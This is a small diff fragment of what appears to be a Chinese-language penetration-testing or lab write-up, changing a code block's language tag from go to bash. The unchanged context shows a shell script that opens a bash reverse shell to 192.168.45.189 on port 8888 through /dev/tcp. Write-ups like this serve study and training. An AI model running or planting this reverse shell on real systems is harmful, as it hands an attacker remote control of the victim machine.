@@ -1034,7 +1034,7 @@ Content-Length: 95
 }
 ```
 go 檔案內容是：
-```go
+```bash
 #!/bin/sh
 bash -c 'bash -i >& /dev/tcp/192.168.45.189/8888 0>&1'
 ```
